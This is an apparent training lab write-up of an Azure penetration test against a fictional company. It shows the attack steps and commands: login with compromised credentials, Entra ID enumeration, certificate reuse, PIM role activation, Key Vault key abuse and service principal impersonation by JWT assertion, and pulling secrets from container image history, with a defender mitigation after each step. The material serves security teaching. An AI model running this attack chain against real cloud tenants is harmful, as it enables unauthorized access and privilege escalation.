## Overview

We created this intermediate-level lab to demonstrate how threat actors can use Certificate-Based Authentication (CBA), Privileged Identity Management (PIM) and Azure Container Registry to escalate privileges and access sensitive data. This lab also showcases tactics such as user and service principal impersonation via JWT assertion, Key Vault and Microsoft Graph API abuse.

## Notes

This story details a penetration testing exercise against MegaBigTech's Azure environment, focusing on their Crypto Operations and PKI Infrastructure team. We'll follow the attacker's journey step-by-step, highlighting their tactics and the defender's potential mitigation strategies.

**Attacker's Perspective:**

The attacker aims to exploit vulnerabilities and misconfigurations to gain access to sensitive data within MegaBigTech's Azure infrastructure. They will leverage compromised credentials, explore various attack vectors, and escalate privileges to achieve their objective.

**Defender's Perspective:**

The defender should have implemented robust security measures to prevent unauthorized access and protect sensitive data. This includes strong access controls, least privilege principle, secure configuration of resources, and regular security assessments.

**Step 1: Initial Foothold**

- **Attacker:** Uses compromised credentials of Mark.Lantern to authenticate to Azure using PowerShell.
    - **Why:** Establishes an initial presence within the target environment.
    - **Command:**
        
        PowerShell
        
        ```
        $password = ConvertTo-SecureString -AsPlainText "Ququ308143$" -Force
        $creds = New-Object System.Management.Automation.PSCredential('Mark.Lantern@megabigtech.com',$password)
        Connect-AzAccount -Credential $creds
        ```
        
- **Defender:**
    - **Prevention:** Enforce strong passwords, multi-factor authentication (MFA), and regular password rotation.
    - **Mitigation:** Implement robust logging and monitoring to detect suspicious login attempts.

**Step 2: Exploring Tenant-Level Permissions**

- **Attacker:** Uses BloodHound and GraphRunner to enumerate Entra ID permissions.
    - **Why:** Attempts to identify any tenant-level roles or permissions assigned to the compromised user.
    - **Commands:**
        
        Bash
        
        ```
        .\azurehound.exe -Username "Mark.Lantern@megabigtech.com" -Password "Ququ308143$"
        ```
        
        PowerShell
        
        ```
        git clone https://github.com/dafthack/GraphRunner; cd GraphRunner
        Import-Module ./GraphRunner.ps1
        Get-GraphTokens
        ```
        
- **Defender:**
    - **Prevention:** Adhere to the principle of least privilege, granting only necessary permissions to users.
    - **Mitigation:** Regularly review and audit user permissions to identify and remove excessive privileges.

**Step 3: Searching SharePoint for Sensitive Information**

- **Attacker:** Uses GraphRunner to search for files within the CryptoOperations SharePoint site.
    - **Why:** SharePoint sites often contain sensitive information like documents and credentials.
    - **Commands:**
        
        PowerShell
        
        ```
        Get-SharePointSiteURLs -Tokens $tokens
        Invoke-SearchSharePointAndOneDrive -SearchTerm "Crypto*" -Tokens $tokens
        ```
        
- **Defender:**
    - **Prevention:** Securely configure SharePoint sites, restrict access to sensitive documents, and educate users about secure information handling practices.
    - **Mitigation:** Implement Data Loss Prevention (DLP) solutions to prevent sensitive data from leaving the organization's control.

**Step 4: Certificate-Based Authentication Abuse**

- **Attacker:** Imports the downloaded certificate and uses it to authenticate as Samantha.Shade.
    - **Why:** Exploits the certificate-based authentication mechanism to gain access to another user's account.
    - **Commands:**
        
        Bash
        
        ```
        openssl pkcs12 -in ./user.pfx -info -nokeys
        ```
        
- **Defender:**
    - **Prevention:** Securely store certificates, enforce strong certificate issuance policies, and monitor certificate usage.
    - **Mitigation:** Implement MFA for certificate-based authentication to add an extra layer of security.

**Step 5: Azure Privileged Identity Management (PIM) Abuse**

- **Attacker:** Activates the "Crypto Operator" role in PIM.
    - **Why:** Exploits the eligible role to gain temporary elevated privileges.
- **Defender:**
    - **Prevention:** Securely configure PIM, enforce strong approval workflows, and monitor role activations.
    - **Mitigation:** Implement Just-In-Time (JIT) access to limit the duration of elevated privileges.

**Step 6: Key Vault Enumeration and Exploitation**

- **Attacker:** Identifies a hidden key associated with the SpAutomateCert certificate in the Key Vault.
    - **Why:** The hidden key can be used to impersonate a service principal.
    - **Commands:**
        
        PowerShell
        
        ```
        Connect-AzAccount -AccessToken $token -KeyVaultAccessToken $keyvaulttoken -AccountId Samantha.Shade@megabigtech.com
        Get-AzKeyVaultKey -VaultName CryptoOps
        ```
        
- **Defender:**
    - **Prevention:** Securely configure Key Vault, restrict access to keys and certificates, and monitor Key Vault activity.
    - **Mitigation:** Use non-exportable keys to prevent the private key from being extracted.

**Step 7: Service Principal Impersonation**

- **Attacker:** Uses SATO to impersonate the SpAutomate service principal via JWT assertion.
    - **Why:** Gains access to resources and permissions assigned to the service principal.
    - **Commands:**
        
        PowerShell
        
        ```
        Invoke-Sato -GrantType "jwt_assertion_sign" -TenantID "2590ccef-687d-493b-ae8d-441cbab63a72" -AppID "4b00c269-23b8-47e3-826e-a76d3c602449" -KeyVaultName "CryptoOps" -CertName "SpAutomateCert" -KeyToken $keyvaulttoken -PredefinedScope MaARM -Decode
        ```
        
- **Defender:**
    - **Prevention:** Securely manage service principals, limit their permissions, and monitor their activity.
    - **Mitigation:** Implement strong authentication mechanisms for service principals and avoid using easily guessable application IDs.

**Step 8: Azure Container Registry Abuse**

- **Attacker:** Connects to the CryptoOps container registry and pulls the fetcherapp image.
    - **Why:** Container images may contain sensitive data or configurations.
    - **Commands:**
        
        Bash
        
        ```
        Connect-AzContainerRegistry -Name CryptoOps
        Get-AzContainerRegistryRepository -RegistryName CryptoOps
        docker pull cryptoops.azurecr.io/fetcherapp:latest
        ```
        
- **Defender:**
    - **Prevention:** Securely configure container registries, restrict access to images, and scan images for vulnerabilities.
    - **Mitigation:** Implement image signing and verification to ensure image integrity.

**Step 9: Extracting Secrets from Image History**

- **Attacker:** Examines the image history and extracts the embedded secret flag.
    - **Why:** Developers often inadvertently leave secrets in image history.
    - **Commands:**
        
        Bash
        
        ```
        docker history cryptoops.azurecr.io/fetcherapp:latest --no-trunc --format '{{json .}}' | ConvertFrom-Json | Format-Table -Property CreatedAt, CreatedBy, Size, Comment
        ```
        
- **Defender:**
    - **Prevention:** Educate developers about secure coding practices and implement security checks in the CI/CD pipeline.
    - **Mitigation:** Use secrets management tools to avoid hardcoding secrets in images.

**Remediation Advice:**

- **Implement strong access controls and least privilege principle.**
- **Enforce strong passwords, MFA, and regular password rotation.**
- **Securely configure resources like SharePoint, Key Vault, and container registries.**
- **Monitor activity and audit logs for suspicious behavior.**
- **Educate users and developers about secure practices.**
- **Regularly conduct security assessments and penetration testing.**

**Alternative Attacker Tools and Techniques:**

- **AzureHound:** Could have been used with a JWT for authentication.
- **OAuth 2.0 Device Code Grant:** Could have been used for phishing attacks.
- **Alternative Tools:** Metasploit, PowerZure, and Azure AD Explorer could have been used for enumeration and exploitation.
## Links
https://goodworkaround.com/2022/02/15/digging-into-azure-ad-certificate-based-authentication/

https://www.netspi.com/blog/technical-blog/cloud-pentesting/attacking-acrs-with-compromised-credentials/

https://www.huntandhackett.com/blog/researching-access-tokens-for-fun-and-knowledge

https://learn.microsoft.com/en-us/azure/key-vault/certificates/about-certificates#composition-of-a-certificate
